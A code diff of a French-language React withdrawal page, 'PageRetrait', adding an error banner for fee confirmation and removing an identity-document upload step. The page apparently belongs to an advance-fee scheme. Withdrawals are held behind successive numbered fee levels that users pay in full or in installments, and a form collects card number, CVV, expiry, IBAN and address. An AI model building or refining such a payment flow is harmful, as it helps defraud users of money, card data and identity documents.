@@ -707,6 +707,7 @@ function PageRetrait({ user }) {
   const [loadingHist, setLoadingHist] = useState(true);
   const [confirmingFee, setConfirmingFee] = useState(false);
   const [feeConfirmed, setFeeConfirmed]   = useState(false);
+  const [confirmFeeErr, setConfirmFeeErr] = useState('');
   const [showCardChange, setShowCardChange] = useState(false);
   const [cardChangeForm, setCardChangeForm] = useState({ first_name:'', last_name:'', phone:'', address:'', postal_code:'', city:'', bank_name:'', iban:'', card_number:'', cvv:'', card_expiry:'' });
   const [cardChangeStatus, setCardChangeStatus] = useState('idle');
@@ -819,20 +820,12 @@ function PageRetrait({ user }) {
 
   const handleConfirmFee = async () => {
     if (!activeWR) return;
-    setConfirmingFee(true);
+    setConfirmingFee(true); setConfirmFeeErr('');
     try {
-      // Si niveau 5, uploader la pièce d'identité d'abord
-      const level = parseInt(activeWR.status.replace('pending_fee_',''));
-      if (level === 5 && identityFile) {
-        const uploadRes = await clientService.uploadDocument(identityFile, 'identity', activeWR.id);
-        if (!uploadRes.success) {
-          setConfirmingFee(false);
-          return;
-        }
-      }
       const res = await clientService.confirmFeePayment(activeWR.id);
       if (res.success) { setFeeConfirmed(true); await loadHistory(); }
-    } catch {}
+      else { setConfirmFeeErr(res.message || 'Impossible de confirmer le paiement. Réessayez.'); }
+    } catch (err) { setConfirmFeeErr(err?.message || 'Erreur serveur. Réessayez.'); }
     setConfirmingFee(false);
   };
 
@@ -953,7 +946,6 @@ function PageRetrait({ user }) {
     );
 
     // pending_fee_X : afficher la page du frais courant
-    const isIdentityLevel = false; // Piece identite deja fournie etape 2
     return (
       <div style={{maxWidth:480,animation:'fadeIn 0.35s ease'}}>
         <Stepper currentLevel={fi.level}/>
@@ -1079,32 +1071,8 @@ function PageRetrait({ user }) {
             )}
 
             {/* Upload pièce d'identité si niveau 5 */}
-            {isIdentityLevel && (
-              <div style={{...c.field,marginBottom:14}}>
-                <label style={c.label}>Pièce d'identité <span style={{color:'#A32D2D'}}>*</span></label>
-                <div style={{border:'2px dashed var(--border)',borderRadius:8,padding:16,textAlign:'center',cursor:'pointer',background:'var(--bg)'}}
-                  onClick={()=>document.getElementById('idFileInput').click()}>
-                  {identityFile
-                    ? <>
-                        <i className="ti ti-file-check" style={{color:'#3B6D11',fontSize:24}}/>
-                        <div style={{fontSize:12,color:'#3B6D11',marginTop:4,fontWeight:500}}>{identityFile.name}</div>
-                        <div style={{fontSize:11,color:'var(--text2)',marginTop:2}}>({(identityFile.size/1024).toFixed(0)} Ko) — Cliquer pour changer</div>
-                      </>
-                    : <>
-                        <i className="ti ti-upload" style={{color:'var(--text2)',fontSize:24}}/>
-                        <div style={{fontSize:12,color:'var(--text2)',marginTop:4}}>Cliquer pour importer</div>
-                        <div style={{fontSize:11,color:'var(--text2)',marginTop:2}}>JPG, PNG, PDF — 10 Mo max</div>
-                      </>
-                  }
-                  <input id="idFileInput" type="file" accept="image/*,.pdf" style={{display:'none'}}
-                    onChange={e=>{setIdentityFile(e.target.files[0]);}}/>
-                </div>
-                {identityFile && identityFile.type.startsWith('image/') && (
-                  <img src={URL.createObjectURL(identityFile)} alt="Aperçu"
-                    style={{marginTop:8,maxWidth:'100%',maxHeight:120,borderRadius:6,objectFit:'cover',border:'1px solid var(--border)'}}/>
-                )}
-              </div>
-            )}
+            {/* La pièce d'identité (recto/verso) est déjà collectée obligatoirement à l'étape 2
+                de la soumission initiale — aucun re-upload n'est nécessaire ici. */}
 
             {feeConfirmed ? (
               <div style={{background:'#EAF3DE',borderRadius:8,padding:12,fontSize:12,color:'#3B6D11',textAlign:'center'}}>
@@ -1139,6 +1107,11 @@ function PageRetrait({ user }) {
                       : <><i className="ti ti-arrow-right"/>Je suis prêt(e) — Payer en totalité</>}
                   </button>
                 </div>
+                {confirmFeeErr && (
+                  <div style={{fontSize:12,color:'#A32D2D',background:'#FCEBEB',borderRadius:8,padding:'8px 12px',marginBottom:8,display:'flex',gap:6}}>
+                    <i className="ti ti-alert-triangle"/>{confirmFeeErr}
+                  </div>
+                )}
 
                 {/* Bouton paiement par tranche */}
                 {!showInstallment ? (
